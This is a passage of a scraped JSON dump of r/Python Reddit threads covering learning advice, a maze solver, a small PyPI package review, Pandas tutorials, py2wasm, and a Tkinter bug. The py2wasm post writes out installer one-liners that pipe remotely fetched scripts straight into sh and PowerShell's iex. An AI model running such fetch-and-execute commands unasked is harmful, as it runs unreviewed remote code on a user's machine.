            "content": "I'm a self-taught programmer and I co-founded a startup in 2018. The company has gone through Y Combinator, raised over 1M in funding, and is close to profitability. So, my process seems to have worked out for me and I hope it can help others too. In terms of what to build after you learn basic syntax, always try to make your own life easier. Python is an especially useful language for automation. If you're trying to solve some problem in your own life, chances are you'll be more willing to stick with a project, because you can imagine the tangible benefit you'll receive at the end. I'm sure a lot of these projects have already been built and it's a common phrase in this industry that you shouldn't rebuild what's already there unless it's fundamentally broken. However, for learning purposes, I think it's ok to ignore this. Here is an example, but I'm sure you guys can come up with lots of things that would be useful to your own life/workflow. - A bot to book DMV appointments for you. I used to always get so frustrated because an available appointment would always be so far out in time. But, you can easily build a bot to check every 5 mins to see if anyone has recently cancelled their spot and if so, you can have your bot book that slot automatically. Or if you want a smaller project, just send you an alert when there is availability. Always build new things and go out of your comfort zone, otherwise, you won't learn. Build something simple, then slowly build on top of it over time. Here is a detailed example of what that might look like: Build a simple scraper to find you apartments for rent in your price range that just got listed online. Then break down your code into reusable pieces and make it more OOP--with classes and methods etc. Next, change as much of the hard coded values to allow for dynamic inputs. In this case, your code might accept the city and a price range in order to run for that specific city at that specific price range. Now, add a simple production level database to your project so you can store those listings for future use. If in the future, those listings still have not leased yet, then it might mean the land lord is desperate and willing to negotiate the rent. Try a SQL based db like mysql or posgresql. The cloud is an important aspect of coding anything in production these days, so next learn how to setup a basic cloud instance with AWS, GCP, or Azure, then move your project to run on the cloud. It's pretty annoying to manually run your code whenever you need the output right? The whole point is about automation, so learn how to use a cron task to run your python code automatically on your cloud instance. During the previous step, you might have noticed that installing dependencies on your laptop might have worked fine, but when you try to do the same thing on the cloud instance, you get errors. This is often due to different dependencies working differently or having a difference in version number for different operating systems. So, learn how to use Docker Containers. Dockerize your existing project and deploy that on your cloud instance instead. Next, the same thing might apply when trying to set up a database locally vs on the cloud, so do the same thing and dockerize your database using existing docker images. Now, you have two containers that you need to run, so it's kind of annoying to run them one at a time, especially if one depends on another to work properly. So, go and learn how to use docker-compose to spin up multiple containers that depend on each other. At this point, you can try some front-end work. Learn how to use Flask, so you can output a list of these rental listings to a static page. Learn some css, so your page can be at least formatted in a nice way. Now, you can share your cool project with your friends and family. But hey, how can they visit a site that only has http with a weird IP address as the url? Read up on how web protocols work and learn how to get a domain and attach that to your cloud instance. Now, you can share your project with friends and family with something like https://mycoolproject.com etc. Hey, turns out a lot of friends find your project to be pretty helpful, so they shared it with their friends and now you've got a bunch of users causing performance issues for your tiny cloud instance. So, go learn a bit more about devops and how to use Kubernetes to scale your 1 tiny instance to multiple instances in order to handle the increased traffic. Boom! You've basically built and scaled a full-stack webapp by yourself! Looking back, you'll see that each step is iterative in terms of learning, so it shouldn't overwhelm you. On top of that, each new step is necessary to grow your project in a meaningful way, so each new topic learned solves something real for you, which is more likely to stick in your brain than working on random coding challenges. If your user count starts skyrocketing, then you might have a real business on your hand. You could even turn it into a startup of your own. If not, having the experience to build a webapp from scratch and deploying it makes you stand out to employers. Heck, I'd hire you myself. You'd be surprised at how often entry level engineers from FAANG companies can't even do 1/4 of what I listed and I'd have to teach them from the ground up. They're usually just taught data structures and how to solve coding challenges straight out of school. Then they're put to work on very very specific things, so they become only good at that one thing unless they're always learning by themselves over the weekends. Hopefully, this helps some of you guys out! If you take anything away from this massively long post, it's to always try and push yourself to learn new things and to always code with a purpose, so you'll be more motivated to complete the project and solve the problems you face along the way."
        },
        {
            "author": "Im__Joseph",
            "score": "1",
            "content": "Great post, thanks u/ASIC_SP! I'm going to add your blog post to the sidebar of the subreddit :)"
        },
        {
            "author": "netneoblog",
            "score": "18",
            "content": "Fantastic post! Upvoted as well deserved"
        }
    ]
},
{
    "post_author": "raaaaaveNN",
    "post_id": "ean4f7",
    "post_score": "1938",
    "post_time": "Saturday, December 14, 2019 at 9:15:43 PM GMT+3",
    "flair_text": "",
    "post_title": "I created a maze generator, then solved it with Djikstra's algorithm",
    "media": [
        "https://preview.redd.it/drttm7ee4n441.png?width=640&crop=smart&auto=webp&s=0eb1df3bcf24aa14eb1b264fccfdb1fe9aa113ea",
        "https://i.redd.it/drttm7ee4n441.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "raaaaaveNN",
            "score": "88",
            "content": "https://github.com/ravenkls/Maze-Generator-and-Solver",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "2",
                    "content": "!remindme 8 hours",
                    "replies": [
                        {
                            "author": "RemindMeBot",
                            "score": "1",
                            "content": "There is a 33.0 minute delay fetching comments. I will be messaging you in 7 hours on 2020-02-06 07:58:56 UTC to remind you of this link CLICK THIS LINK to send a PM to also be reminded and to reduce spam. Parent commenter can delete this message to hide from others. Info Custom Your Reminders Feedback"
                        }
                    ]
                },
                {
                    "author": "ADrunkIrish",
                    "score": "0",
                    "content": "!remindme 12 hours",
                    "replies": [
                        {
                            "author": "RemindMeBot",
                            "score": "1",
                            "content": "I will be messaging you in 20 minutes on 2019-12-15 08:02:46 UTC to remind you of this link 16 OTHERS CLICKED THIS LINK to send a PM to also be reminded and to reduce spam. Parent commenter can delete this message to hide from others. Info Custom Your Reminders Feedback"
                        },
                        {
                            "author": "BaronHeal",
                            "score": "-5",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "prologic0313",
                    "score": "-4",
                    "content": "!remindme 6 hours"
                },
                {
                    "author": "Silentroar23",
                    "score": "-5",
                    "content": ""
                },
                {
                    "author": "HHCB",
                    "score": "-15",
                    "content": ""
                }
            ]
        },
        {
            "author": "Gawd_is_great",
            "score": "67",
            "content": "Make your algorithm solve my mazes There's a 4K image in that repo The white lines are the paths Go from northwest to Southeast corner. https://github.com/Perseus-Perry/Maze-Generator"
        },
        {
            "author": "Mint-Plant-Lover",
            "score": "23",
            "content": "Really cool! Did it take long to create this image?"
        },
        {
            "author": "Scoundrelic",
            "score": "10",
            "content": "What do the colors represent? Very nice, btw!"
        },
        {
            "author": "Sw429",
            "score": "80",
            "content": "Seems like Dijkstra's is excessive here. Why not just a simple BFS?"
        },
        {
            "author": "ThaeliosRaedkin1",
            "score": "19",
            "content": "Now we can use both to create an adversarial neural network to create fiendishly difficult mazes! Good work, OP!"
        },
        {
            "author": "spennetrator94",
            "score": "4",
            "content": "Zoom in and out really fast."
        },
        {
            "author": "minuteman_d",
            "score": "4",
            "content": "I wonder if there's any benefit to something like A* in a map that only has one solution (as you'd have with a maze). Another question: what about mazes with multiple solutions? Thinking about how you could make a maze using multiple generators when working with backtracker algorithm? Relevant Computerphile: https://www.youtube.com/watch?v=ySN5Wnu88nE"
        },
        {
            "author": "__zero_or_one__",
            "score": "3",
            "content": "Zooming in on mobile was so satisfying"
        }
    ]
},
{
    "post_author": "dan_ohn",
    "post_id": "1cbr1fz",
    "post_score": "0",
    "post_time": "Wednesday, April 24, 2024 at 9:06:00 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "find_where - my first Python package published to PyPi",
    "media": [
        "https://pypi.org/project/find-where/",
        "https://github.com/danohn/find_where"
    ],
    "post_content": "PyPi\nSource\nWhat My Project Does\nfind_where is a Python package that provides a function to find values in dictionaries where a specified key matches a given value, similar to filtering in SQL.\nTarget Audience\nThis is my first attempt at creating a Python package so I would describe this as a toy project at this stage but am definitely looking for feedback from the wider community.\nComparison\nI mainly wrote this package because I kept on writing the same iterable based code when trying to find a value, given a key:\ndata = {\n\"people\": [\n    {\"first_name\": \"John\", \"last_name\": \"Smith\", \"age\": 25},\n    {\"first_name\": \"Alice\", \"last_name\": \"Jones\", \"age\": 32},\n    ]\n}\n\nfirst_name = None\n\nfor result in data[\"people\"]:\n    if result[\"age\"] == 32:\n        first_name = result[\"first_name\"]\n        break\n\nprint(first_name)\nWhen using find_where, you can simply run:\nfrom find_where import find_where\n\ndata = {\n    \"people\": [\n        {\"first_name\": \"John\", \"last_name\": \"Smith\", \"age\": 25},\n        {\"first_name\": \"Alice\", \"last_name\": \"Jones\", \"age\": 32},\n    ]\n}\n\nfirst_name = find_where(data[\"people\"], \"first_name\", age=32)\n\nprint(first_name)\nAppreciate any feedback, constructive or otherwise!",
    "comments": [
        {
            "author": "Taborlin_the_great",
            "score": "20",
            "content": "Your example is not very compelling. What are you doing that you need to repeatedly search a list of dicts for matching elements? This really feels like there’s better way to store this data than a list of dicts. That said I have some critiques of your code as well. You explicitly check if the data argument is a dict or a list. If it’s a dict you then wrap it in a list. I’d make the required type for the data argument be an itetable. The only thing you do with this list is iterate over it. Maybe the dicts I want to filter using your function are coming from a generator. If your caller has a single dictionary they want to search with your function they can wrap it in their own list. Your function returns either a list or a single value depending on how many items are found. How am I supposed to tell which was returned if the values of my dict are lists? Also you have an if statement to see if only one result was found. The caller is going to have to write an equivalent if statement to handle this very same case. Just always return a list. If no matching items were found I’ll get back an empty list. The code I have to write as the caller will be the same for all of 0, 1, or more items found. I think it’s a strange choice to use dict.get when filtering on the kwags. What if I wanted to find some value where the key was supposed to be none? Now dicts that don’t have that key at all will match. If you’re going to use get here give get a default value that you control so you can distinguish these two cases. It’s also odd that you allow the keys filtered on to not exist (by using get) but not the key to return. Feels like it should be symmetric to me. Edit took another look. This is all you need for this function def find_where(data, return_key, **kwargs): return  [d[return_key] for d in data if all(d.[k] == v for k, v in kwargs.items())]",
            "replies": [
                {
                    "author": "dan_ohn",
                    "score": "5",
                    "content": "Thank you so much for the detailed reply and critiques, there are so many things that I hadn't considered that I can now try to tackle. I agree about the example not being compelling, in the real world I am using a REST API service that has a Python helper library. That library essentially returns Python dictionaries and will have a list of dicts for the various data coming back from their API."
                }
            ]
        },
        {
            "author": "divad1196",
            "score": "9",
            "content": "first thing: congrats for your first package. But on a more bitter note, there are tons of package doing the same. For example, glom is a powerful library that let's you find and/or transform you data, and for this particular use-case I would still use it if I need something complex. But as explained by someone else, this can be written as a single simple function, so I won't bother adding a dependency just for that (or even search for it). This would be a javascript mindset to create libraries for every single function."
        },
        {
            "author": "_N0K0",
            "score": "5",
            "content": "Congrats, a suggestion for next steps would be to add Github actions and look into more complex use cases for example. Right now this is basically a one liner with a lot of supporting framework.",
            "replies": [
                {
                    "author": "dan_ohn",
                    "score": "1",
                    "content": "Thank you so much for your feedback!"
                }
            ]
        },
        {
            "author": "YesterdayDreamer",
            "score": "4",
            "content": "from find_where import find_where data = { \"people\": [ {\"first_name\": \"John\", \"last_name\": \"Smith\", \"age\": 25}, {\"first_name\": \"Alice\", \"last_name\": \"Jones\", \"age\": 32}, ] } Not a criticism, appreciate the effort and keep it up. Just wanted to add that this first_name = find_where(data[\"people\"], \"first_name\", age=32) Can also be written as first_name = [i[first_name] for i in data[people] if i[age]==32] as others suggested, more complex examples can make it more compelling. For instance, can I do find_where(data['people'], ['fname' , 'lname'], age between 32 and 45, name like 's%')"
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "For me, it's a readability thing. If I were to use a filter, this would be the code: filtered_data = filter(lambda x: x[\"age\"] == 32, data[\"people\"]) first_name = next(filtered_data, None) print(first_name[\"first_name\"] if first_name else None) Personally, I use my code in a lot of projects to essentially abstract away the non-readabiltiy.",
            "replies": [
                {
                    "author": "dan_ohn",
                    "score": "1",
                    "content": "For me, it's a readability thing. If I were to use a filter, this would be the code: filtered_data = filter(lambda x: x[\"age\"] == 32, data[\"people\"]) first_name = next(filtered_data, None) print(first_name[\"first_name\"] if first_name else None) Personally, I use my code in a lot of projects to essentially abstract away the non-readabiltiy."
                }
            ]
        },
        {
            "author": "Salfiiii",
            "score": "2",
            "content": "Check out nested_lookup: https://git.unturf.com/python/nested-lookup/"
        },
        {
            "author": "hotplasmatits",
            "score": "-2",
            "content": "first_name = pd.DataFrame().from_records(data['people']).query('age == 32')['first_name']"
        }
    ]
},
{
    "post_author": "cyprusgreekstudent",
    "post_id": "1ca5b0g",
    "post_score": "15",
    "post_time": "Monday, April 22, 2024 at 11:11:33 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How to Clean Data and work with outliers and Missing Data in Python Pandas",
    "media": [
        "https://github.com/werowe/HypatiaAcademy/blob/master/pandas/pandas_missing_data.ipynb"
    ],
    "post_content": "I made a detailed tutorial on how to work with missing data, outliers, and how to lean up data in Pandas Python. This explains how to clean up your data so that your statistical results and trainin data is not skewed.\nhttps://github.com/werowe/HypatiaAcademy/blob/master/pandas/pandas_missing_data.ipynb",
    "comments": [
        {
            "author": "Measurex2",
            "score": "2",
            "content": "The survey data may be a poor choice if your plan is to use it analytically. Here's a good basic overview on the common types of missing data and items you could infer from it. The solve is dependent on the context and objective. https://en.m.wikipedia.org/wiki/Missing_data#:~:text=Missing%20at%20random%20(MAR)%20occurs,rely%20on%20its%20substantive%20reasonableness. Since you have this in Jupyter, I recommend updating each section to be more of a lesson format what you found why it's important how you can handle it You have a few areas where pandas has common built in one liners like value_counts() or describe() that may be more useful.",
            "replies": [
                {
                    "author": "cyprusgreekstudent",
                    "score": "-3",
                    "content": "Ιm using it to teach Ukrainian children data science. Just made it up. Not going to use it for analysis. That said if you know of a data source that needs cleaning up that I could use for analysis let me know. I looked all over the internet and found nothing suitable.",
                    "replies": [
                        {
                            "author": "Measurex2",
                            "score": "7",
                            "content": "I dont know how you perform data science without analysis given most models use inference. A lack of data is by itself useful information depending on the context. For kids - I would have picked a more relatable dataset though like pokemon characters and their stats. What kind of models are you planning? Basic regression, classification and clustering methods?"
                        },
                        {
                            "author": "old_bearded_beats",
                            "score": "1",
                            "content": "Kaggle"
                        }
                    ]
                }
            ]
        },
        {
            "author": "nbviewerbot",
            "score": "0",
            "content": "I see you've posted a GitHub link to a Jupyter Notebook! GitHub doesn't render large Jupyter Notebooks, so just in case, here is an nbviewer link to the notebook: https://nbviewer.jupyter.org/url/github.com/werowe/HypatiaAcademy/blob/master/pandas/pandas_missing_data.ipynb Want to run the code yourself? Here is a binder link to start your own Jupyter server and try it out! https://mybinder.org/v2/gh/werowe/HypatiaAcademy/master?filepath=pandas%2Fpandas_missing_data.ipynb I am a bot. Feedback | GitHub | Author"
        }
    ]
},
{
    "post_author": "Neb519",
    "post_id": "lain0r",
    "post_score": "1881",
    "post_time": "Tuesday, February 2, 2021 at 3:21:38 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Hey Reddit, here's my comprehensive course on Python Pandas, for free.",
    "media": [
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-6-series-vectorization",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-12-challenge-vending-machines",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-6-challenge-class-transitions",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-13-challenge-cradle-robbers",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-6-dataframe-view-vs-copy",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-9-challenge-baby-names",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-13-challenge-fair-teams",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-8-series-view-vs-copy",
        "https://www.youtube.com/playlist?list=PL9oKUrtC4VP7ry0um1QOUUfJBXKnkf-dA",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-1-dataframe-creation",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-12-challenge-price-gouging",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-7-series-apply",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-9-dataframe-groupby",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-2-series-basic-indexing",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-10-challenge-bees-knees",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-4-series-boolean-indexing",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-8-dataframe-aggregation",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-5-dataframe-reshaping",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa/",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-10-challenge-ob-gym",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-7-challenge-rose-thorn",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-1-series-creation",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-3-categoricals",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-5-series-missing-values",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-3-challenge-tv-commercials",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-7-dataframe-merge",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-10-challenge-hobbies",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-9-challenge-session-groups",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-3-dataframe-basic-indexing",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-1-1-introduction",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-5-dataframe-apply",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-1-challenge-covid-tracing",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-8-challenge-product-volumes",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-2-challenge-pickle",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-2-dataframe-to-and-from-csv",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-5-challenge-concerts",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-11-challenge-car-shopping",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-14-challenge-pot-holes",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-2-dates-and-times",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-4-dataframe-basic-operations",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-4-multiindex",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-1-strings",
        "https://www.gormanalysis.com/blog/python-numpy-for-your-grandma/",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-11-challenge-party-time",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-4-challenge-family-iq",
        "https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-3-series-basic-operations"
    ],
    "post_content": "The course is called Python Pandas For Your Grandpa - So easy your grandpa could learn it. (It's the successor to Python NumPy For Your Grandma.)\nCourse Curriculum\nIntroduction\n1.1 Introduction\nSeries\n2.1 Series Creation\n2.2 Series Basic Indexing\n2.3 Series Basic Operations\n2.4 Series Boolean Indexing\n2.5 Series Missing Values\n2.6 Series Vectorization\n2.7 Series apply()\n2.8 Series View vs Copy\n2.9 Challenge: Baby Names\n2.10 Challenge: Bees Knees\n2.11 Challenge: Car Shopping\n2.12 Challenge: Price Gouging\n2.13 Challenge: Fair Teams\nDataFrame\n3.1 DataFrame Creation\n3.2 DataFrame To And From CSV\n3.3 DataFrame Basic Indexing\n3.4 DataFrame Basic Operations\n3.5 DataFrame apply()\n3.6 DataFrame View vs Copy\n3.7 DataFrame merge()\n3.8 DataFrame Aggregation\n3.9 DataFrame groupby()\n3.10 Challenge: Hobbies\n3.11 Challenge: Party Time\n3.12 Challenge: Vending Machines\n3.13 Challenge: Cradle Robbers\n3.14 Challenge: Pot Holes\nAdvanced\n4.1 Strings\n4.2 Dates And Times\n4.3 Categoricals\n4.4 MultiIndex\n4.5 DataFrame Reshaping\n4.6 Challenge: Class Transitions\n4.7 Challenge: Rose Thorn\n4.8 Challenge: Product Volumes\n4.9 Challenge: Session Groups\n4.10 Challenge: OB-GYM\nFinal Boss\n5.1 Challenge: COVID Tracing\n5.2 Challenge: Pickle\n5.3 Challenge: TV Commercials\n5.4 Challenge: Family IQ\n5.5 Challenge: Concerts\nAlternatively, view my YouTube playlist for the course here.\nIf you find this useful, please consider liking, subscribing, and sharing. It means a lot. You wouldn't believe how much effort went into creating this course.\nThanks!",
    "comments": [
        {
            "author": "JoughRolls",
            "score": "154",
            "content": "I look forward to the next video series along the lines of “Python Matplotlib For Your 3rd Grade Kid”"
        },
        {
            "author": "SzechuanSaucelord",
            "score": "15",
            "content": "Thanks boss"
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Then, you've found the right course on Pandas my friend ;) Not sure. I'm starting a big consulting project involving geospatial data, so maybe that. But I've been itching to get to Neural Networks. Finding time is the challenge.",
            "replies": [
                {
                    "author": "Neb519",
                    "score": "29",
                    "content": "Then, you've found the right course on Pandas my friend ;) Not sure. I'm starting a big consulting project involving geospatial data, so maybe that. But I've been itching to get to Neural Networks. Finding time is the challenge."
                }
            ]
        },
        {
            "author": "nesclassicedition_",
            "score": "8",
            "content": "This gives me confidence that i can learn python too lol! Been trying some courses on UDEMY and it seems so overwhelming . Thanks for sharing this!!"
        }
    ]
},
{
    "post_author": "desmoulinmichel",
    "post_id": "1cb0l1i",
    "post_score": "48",
    "post_time": "Tuesday, April 23, 2024 at 12:50:24 PM GMT+3",
    "flair_text": "News",
    "post_title": "Py2wasm: A Python to Wasm compiler 3x faster than pyiodide",
    "media": [
        "https://nuitka.net/",
        "https://wasmer.io/posts/py2wasm-a-python-to-wasm-compiler"
    ],
    "post_content": "Take the excellent nuitka, compile python code to C, turn it into web assembly, and you got Python in the browser, without the usual runtime overhead:\nhttps://wasmer.io/posts/py2wasm-a-python-to-wasm-compiler\nWhile the doc states you can get this effect by doing:\npip install py2wasm\npy2wasm myprogram.py -o myprogram.wasm\nwasmer run myprogram.wasm\nYou still need the wasmer WASM runtime (curl https://get.wasmer.io -sSfL | sh for Unix users, iwr https://win.wasmer.io -useb | iex for Windows user with Powershell), however. But more than that, since you need nuikta, it means you need a C compiler installed. While in Ubuntu it's a just an sudo apt install build-essential, it will require a bit more work on Windows and Mac.",
    "comments": [
        {
            "author": "magnomagna",
            "score": "8",
            "content": "But more than that, since you need nuikta, it means you need a C compiler installed. You need clarify this a bit. Any compiler that compiles C into WASM is also a C compiler. That said, I do believe you mean the usual C compilers that can target hardware architectures, such as gcc, clang, msvc, etc. it will require more work on Windows Reading the documentation, nuitka gives three options: MinGW-w64, msvc (visual studio), and clang (via visual studio). Well, there’s an interesting project winlibs that provides a portable toolchain including both gcc and clang with MinGW-w64 native Windows libraries, meaning the compilers included compile C into native Windows programs. Since it’s portable, there’s absolutely no installation and no messing with Windows registry at all. To use it, you just need to unzip, set your PATH and run! -—- I personally haven’t tried winlibs, as I use Clang on Windows, and Nuitka’s documentation (like many others that include Clang) is wrong about having to use Visual Studio in order to use Clang on Windows. To use Clang without Visual Studio, you just need to install the same dependencies that Visual Studio needs without installing Visual Studio itself! The dependencies can be installed with the same installer for Visual Studio and the user can opt out of installing Visual Studio (just untick the checkbox) and just install the other components. You also need to install Windows SDK for the UCRT headers. These are of course for clang and C11 support isn’t complete IIRC, which nuitka needs. I’d definitely try winlibs first."
        },
        {
            "author": "-defron-",
            "score": "4",
            "content": "Would have been nice to see the binary sizes of a non-trivial bit of code. That's always been the big problem for wasm and garbage collected languages since wasm doesn't have a GC so you need to ship your own. Cool concept and incidentally I referenced it and pydide yesterday, but the klunkiness of wasm UI interop and the large binary sizes are still big road blocks for me considering it for anything more than fun personal projects"
        },
        {
            "author": "pysk00l",
            "score": "2",
            "content": "how complex can the code be? Can I have simply pygame games converted with no issues? what about code that uses libraries like pandas etc?"
        },
        {
            "author": "binlargin",
            "score": "2",
            "content": "Interesting. How fast is it to initially load, and are there any libraries that can be used to access the dom from wasm? If the browser is feasible we could have FastUI generator that makes wasm widgets from pure python rather than leaning on React"
        }
    ]
},
{
    "post_author": "dartyet1",
    "post_id": "hbg6dw",
    "post_score": "1933",
    "post_time": "Thursday, June 18, 2020 at 5:57:56 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made the rotating circle *illusion* from numberphile's lates video",
    "media": [
        "https://preview.redd.it/btxrsdkino551.gif?format=png8&s=1ff0cb978fc801edbf705872e645864ec9295c3c"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "synysterbates",
            "score": "120",
            "content": "Why is it an illusion?",
            "replies": [
                {
                    "author": "dartyet1",
                    "score": "108",
                    "content": "The way it works is by moving those yellow disks with a sine wave based on the blue disk's position. In the end, it looks like a rotating circle. It's technically not an illusion and that why I added stars to that word. Watch numberphile's video for a more in depth explanation https://www.youtube.com/watch?v=snHKEpCv0Hk&feature=emb_logo",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "88",
                            "content": "Is it an illusion or is that how all 2d spinning wheels work 🤔"
                        },
                        {
                            "author": "Pillars-In-The-Trees",
                            "score": "40",
                            "content": "It's technically not an illusion and that why I added stars to that word. Never seen the \"quotations for emphasis\" mistake in reverse before."
                        },
                        {
                            "author": "Araignys",
                            "score": "16",
                            "content": "You should use quotation marks (“) to imply doubt or sarcasm. Asteriskes (*) around a word are for emphasis (because in some markups they will produce bold text). That’s why you should never buy from a greengrocer’s that promises “fresh” produce."
                        }
                    ]
                },
                {
                    "author": "ridgeossal",
                    "score": "16",
                    "content": "Yellow dots are perpendicular projections of the blue dot on respective lines",
                    "replies": [
                        {
                            "author": "Nephty23",
                            "score": "5",
                            "content": "rgbcockroach."
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "11",
                    "content": "Each yellow dot is actually moving along the radial lines from center to the circle, and then back again. The yellow dots are not a circle moving around with the blue dot",
                    "replies": [
                        {
                            "author": "2plash6",
                            "score": "1",
                            "content": "Yes. True. Not actually a spinning wheel."
                        }
                    ]
                },
                {
                    "author": "javier123454321",
                    "score": "1",
                    "content": "ya see kid... there is no wheel"
                },
                {
                    "author": "azur08",
                    "score": "1",
                    "content": "Several people not understanding why you asked this question lol"
                }
            ]
        },
        {
            "author": "dartyet1",
            "score": "39",
            "content": "Here is the github repo: https://github.com/AtaTrkgl/numberphile-beautifultrig"
        },
        {
            "author": "dzeynep",
            "score": "13",
            "content": "how did you create the interface?"
        },
        {
            "author": "7Geordi",
            "score": "13",
            "content": "I don't see why this is an illusion It is both a rotating circle and a set of points moving along diameters of the great circle."
        },
        {
            "author": "AlSweigart",
            "score": "4",
            "content": "I saw this Numberphile episode and was delighted because I also created this interactive animation after seeing it online somehwere."
        },
        {
            "author": "drunkdobby",
            "score": "4",
            "content": "An animation. What you made was an animation."
        },
        {
            "author": "TheGunslingerFollwed",
            "score": "2",
            "content": "It like looking at an open fire... I just can't stop."
        },
        {
            "author": "bazziapps",
            "score": "2",
            "content": "thats dope. Well done man"
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "That video was awesome, and your recreation is great!"
        }
    ]
},
{
    "post_author": "ranemaeker",
    "post_id": "1ca1en9",
    "post_score": "16",
    "post_time": "Monday, April 22, 2024 at 7:05:29 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Tkinter Variable class C/Python garbage collection mismatch ",
    "media": [],
    "post_content": "Tkinter is going to drive me crazy.\nLet me lay this out for you:\nTkinter is the GUI interface I am using, which is a python frontend for a C library\nIt holds \"widgets\" in a window.\nSome widgets have variables (StringVar, BooleanVar, etc - not \"variables\" like code variables but a class of updatable data holders for the widgets to link to the Tcl backend)\nThe Vars have incremental names like PYVAR1, PYVAR93, etc by default.\nNames can be provided to the Vars via keywords upon initialization. (Note I have not been able to find any reason to not do this - hence this post)\nNames should absolutely not be provided to the Vars unless they are unique. Because on python garbage collection (or \"del Var\" command) the Vars are told to destroy() themselves and then this command is passed to C \"destroy this Var.\"\nBut the garbage collection in C (or rather Tcl) is slightly delayed from Python...\nSo if I immediately I instantiate a different Var with a different value (or same value, who knows) but reusing the same name, the Var has been deleted in Python (yey!) but it has not been deleted in C yet (uh oh). C says to Python oh hey I got this Var already, use it, don't make a new one. So python goes to use it and then OOPS NEVERMIND LOL IT'S DELETED IN C HAHAHA\nSo now I have this Var that I can't access in Python because it's a Schrodinger's Variable: it both exists and does not exist. Wonky behavior too, like check boxes that are in no state at all, neither checked nor unchecked, and I can't access the variable to see what state it is in because the variable that existed before the one I'm using no longer actually exists. So the Var I can access looks 100% fine! But if I put a value checker in just the right place I can catch where the wonky behavior exists.\nThis has been a frustrating several weeks.\nAnyway. I have not been able to find any information about this and thought I'd share. Hopefully this helps someone avoid the mistake I made. I have since set all Var names to be the incremental default names.\nEdit: after quite a bit of experimentation I have discovered the issue is not in the Variable naming but in the fact that I had the Variables stored as attributes in my custom widget classes. The attributes were not being cleaned up properly on widget destroy(). The simple solution is to pop the variable attribute from the widget dict before child.destroy().",
    "comments": [
        {
            "author": "the_hoser",
            "score": "15",
            "content": "You're not fighting with C's garbage collector. C doesn't have a garbage collector. You're fighting with TCL's garbage collector. It's been a while since I've done any serious work with Tkinter, but IIRC the solution I came up with was to never destroy Tk resources. Just update them. I recommend switching to something else, if you can.",
            "replies": [
                {
                    "author": "ranemaeker",
                    "score": "-1",
